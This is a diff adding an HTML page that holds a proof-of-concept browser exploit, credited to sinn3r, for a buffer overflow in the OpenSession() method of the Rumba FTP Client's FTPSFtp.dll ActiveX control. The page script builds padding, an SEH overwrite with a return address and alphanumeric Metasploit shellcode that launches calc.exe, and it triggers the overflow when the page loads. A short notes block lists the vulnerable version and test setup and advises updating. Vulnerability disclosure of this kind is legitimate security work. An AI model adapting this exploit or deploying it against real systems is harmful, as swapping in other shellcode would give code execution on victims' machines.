@@ -1,0 +1,66 @@
+<html>
+<head>
+<title>Rumba FTP Client FTPSFtp.dll v4.2.0.0 OpenSession() Buffer Overflow by sinn3r</title>
+</head>
+<body>
+<object classid="clsid:677A6F83-52A0-4931-8E62-EC713EE9B949" id="ftpsftp"></object>
+<script language="JavaScript">
+/*
+Rumba FTP Client FTPSFtp.dll v4.2.0.0 OpenSession() Buffer Overflow
+Vulnerable version download: http://download.cnet.com/Rumba-FTP/3000-2160_4-10587778.html
+Found and coded by sinn3r
+Greets: Corelan Security Team & Exploit-DB
+http://twitter.com/_sinn3r
+1) Script provided 'as is', without any warranty. Use for educational purposes only.
+2) Do not use this code to do anything illegal, that's ridiculous!
+3) You are not allowed to edit/modify this code. If you do, original author cannot be
+   held responsible for any damages this may cause.
+*/
+
+// http://www.metasploit.com  windows/exec cmd=calc.exe 200 bytes
+shellcode = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLM8LI5PUPUPSPM"+
+            "YZEVQN2BDLKPRVPLKQB4LLK0RR4LKSBWX4ONW1ZWVFQKO6QO0NLWL3QSLS26L7PIQ8ODM5QIWK"+
+            "RZPPRQGLKQB4PLKPB7L5QXPLKQP2XK5IP44QZ5QXPPPLKQX4XLKQHGPUQN3KSGLQYLKP4LKUQ9"+
+            "FFQKOVQO0NL9QXODM5QYWFXKPD5JT4C3MZXWK3MWTT5KRPXLKQHWTEQ8SCVLKTLPKLKQH5LEQN"+
+            "3LKS4LKC1XPMY1TWTGT1KQKSQ0YPZ0QKOKP0XQOQJLKTRJKMVQMCZUQLMLEOIUPUPC0PPRHP1L"+
+            "KROLGKON5OKZPNUORF6RHOVLUOMMMKOIE7LC6SLUZMPKKM0BU5UOKQWB32R2ORJ5PPSKOHUE35"+
+            "12LSS6N3U2X3UUPDJA";
+
+eaxAlign  = unescape(
+"%58"+		//POP EAX
+"%04%0B"	//ADD AL, 0x0B
+);
+
+// Original fuzzed size = 13332 bytes. This POC uses 5000 bytes.
+var padding1	= unescape("%41");
+while (padding1.length < 600)
+	padding1 += unescape("%41");
+var nseh	= unescape("%EB%06%42%42");	//Short JUMP
+var seh		= unescape("%71%33%6E%74");	//0x746E3371  msls31.dll  <-- IE 6 addr
+var padding2	= unescape("%41");
+while (padding2.length < 4389-shellcode.length)
+	padding2 += unescape("%41");
+
+ftpsftp.OpenSession(padding1 + nseh + seh + eaxAlign + shellcode + padding2);
+</script>
+<pre>
+|------------------------------------------------------------------|
+|   Rumba FTP Client FTPSFtp.dll v4.2.0.0 OpenSession() Overflow   |
+|                                                                  |
+| by sinn3r - Corelan & Exploit-DB             twitter.com/_sinn3r |
+|------------------------------------------------------------------|
+
+This bug was found when I was verifying another bug for Exploit-DB. Please note that
+the latest version of FTPSFtp.dll v4.2.3.0.0 is no longer vulnerable to this, and it
+is (duh!) recommended to update your Rumba FTP to the latest version if possible.
+
+[+] Vulnerable Component = FTPSFtp.dll
+[+] Version              = 4.2.0.0
+[+] Function:            = OpenSession ( ByVal __MIDL_0011 As String ) As Object
+[+] progid               = FTPSFTPLib.SFtpApplication
+[+] Tested on            = Windows XP SP3 ENG + IE 6
+[+] Payload              = windows/exec cmd=calc.exe
+[+] Special thanks       = rAWjAW and chap0 for testing
+</pre>
+</body>
+</html>
